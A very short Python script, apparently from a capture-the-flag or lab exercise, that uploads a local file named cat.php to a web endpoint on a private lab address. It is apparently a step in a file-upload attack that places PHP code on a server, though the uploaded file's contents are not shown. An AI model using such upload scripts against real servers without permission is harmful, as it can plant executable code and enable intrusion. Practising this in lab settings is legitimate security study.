import requests


url = 'http://10.10.69.207/cat/'
f = open('./cat.php')
file_data = {'cat': f}

r = requests.post(url, data={}, files=file_data)

print(r)
